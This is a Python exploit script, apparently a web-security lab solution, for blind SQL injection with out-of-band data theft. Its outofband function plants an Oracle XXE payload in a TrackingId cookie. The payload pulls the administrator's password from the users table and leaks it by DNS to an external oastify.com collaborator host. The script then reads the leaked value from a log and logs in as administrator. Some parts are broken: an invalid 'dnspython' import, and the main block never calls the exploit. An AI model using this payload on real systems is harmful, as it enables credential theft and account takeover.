import urllib3
import sys
import requests
from bs4 import BeautifulSoup
import dnspython as simplydns
import dns.resolver

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def getCSRF(r):
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = '/login'
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    t = s.post(fullurl, verify=False, proxies=proxies, data=data)
    if 'Log out' in t.text:
        print('\n Login Bypassed')

    else :
        print('\n Log In bypassed failed')

def resolvelogs():
    fileobj=open("logs.txt")
    lines=[]
    password = ""
    for line in fileobj:
     if 'Host:' in line :
         lines.append(line.strip())
         line1 = []
         line1 = line.split()
         password = line1[1][:20]
         return password


def outofband(url):
    uri = "/"
    fullurl = url + uri
    payload = "'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"'1.0'"+encoding%3d"'UTF-8'"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d"'administrator'")||'.bbqms24r2i5whfyn3grl9edj5ab1zwnl.oastify.com/"">+%25remote%3b]>'),'/l')+FROM+dual)--"
    cookie = {
        'TrackingId':'w5yg4r0SrexqYxJI' + payload,
         'session':'5WD6Dci9TwD0POz21wzqqlwfdMNhzSDi'}
    r = requests.get(fullurl, verify=False, proxies=proxies,cookies=cookie)
    if r.status_code == 200:
      username = 'administrator'
      password = resolvelogs()
      login(username, password, url)
      

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])


